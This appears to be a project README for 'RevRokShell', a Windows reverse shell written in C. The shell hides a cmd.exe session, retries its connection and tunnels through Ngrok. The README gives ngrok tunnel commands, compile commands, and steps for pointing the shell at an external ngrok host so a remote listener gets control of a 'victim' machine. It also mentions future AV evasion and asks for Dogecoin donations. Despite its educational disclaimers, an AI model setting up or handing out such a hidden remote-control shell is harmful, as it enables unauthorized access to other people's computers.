# RevRokShell — Reverse Shell with Ngrok Tunnel

---

### ⚠️ Disclaimer

> **This project is intended strictly for educational, ethical hacking, and cybersecurity research purposes.**
>
> Do **not** use this tool against any system or network without **explicit written permission** from the owner. Misuse of this tool may result in **legal consequences**.

---

### About

This project demonstrates a **basic reverse shell in C** on Windows that:

* Launches **Ngrok** to expose a TCP port (e.g., 4444) over the internet.
* Connects back to `127.0.0.1:4444`, where Ngrok forwards traffic.
* Spawns a hidden `cmd.exe` session, allowing remote shell control.
* Logs all actions to `C:\temp\tampa.txt` for debugging or auditing.
* Automatically reconnects if the connection fails or closes.

---

### 🔧 Features

* Automatic setup of Ngrok via `cmd.exe`
* Background reverse shell loop with error logging
* Connection persistence and retry logic
* Supports **reserved TCP domains** (Ngrok paid feature)

---

### How It Works (Theory)

> Due to the author **not having an active Ngrok subscription**, the final reserved domain logic has not been tested live — but is **designed correctly in theory**.

**When executed:**

1. Ngrok is authenticated using your token (once).
2. Ngrok starts a TCP tunnel:

   ```
   ngrok tcp --remote-addr=your-reserved-name.ngrok-free.app:4444 4444
   ```
3. Victim shell connects to `127.0.0.1:4444`, which Ngrok tunnels to the internet.
4. You connect from a remote system to:

   ```
   your-reserved-name.ngrok-free.app:4444
   ```
5. You gain a reverse shell in your listener (e.g., Netcat, Metasploit).

---

### 🔐 Ngrok Configuration

Make sure to:

* Download and place `ngrok.exe` in your system's PATH.
* Replace this line with your **Ngrok authtoken**:

  ```c
  ngrok config add-authtoken <YOUR_TOKEN_HERE>
  ```
* Reserve your domain and port at [Ngrok Dashboard](https://dashboard.ngrok.com/) before use.

🚫 **Your actual token has been removed from the public version of this README.**

---

### ⚙️ Compilation

To compile on Windows:

```bash
cl reverse_shell.c /link ws2_32.lib
```

If you don't have `cl` (MSVC), use GCC (MinGW):

```bash
gcc reverse_shell.c -o reverse_shell.exe -lws2_32
```

---

### Testing Locally (Without Reserved Domain)

If you're not using a reserved domain:

1. Start Ngrok manually:

   ```bash
   ngrok tcp 4444
   ```
2. Note the forwarded address like:

   ```
   tcp://0.tcp.ngrok.io:12345
   ```
3. Change the IP and port in your code to match:

   ```c
   char ip_addr[] = "0.tcp.ngrok.io";
   char port[] = "12345";
   ```
4. Recompile and run.

---

### 💸 Donations

Want to support my learning and help me buy an Ngrok subscription?

> **Dogecoin address:**

```
DHERUQ8925qMWCcGzJZQe43E9yEfnpVK3p
```

Even small tips help me explore more advanced topics like encrypted shells, AV evasion, and secure coding. Thanks! 🚀🐶

---

### 📚 Credits

* Windows API documentation – [Microsoft Docs](https://learn.microsoft.com/)
* Reverse Shell & Sockets concept – [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* Ngrok Tunnel usage – [Ngrok Docs](https://ngrok.com/docs)

---

### Final Reminder

> Never test reverse shells on devices you do not own or control.
>
> Learn, don’t break. Build, don’t destroy.
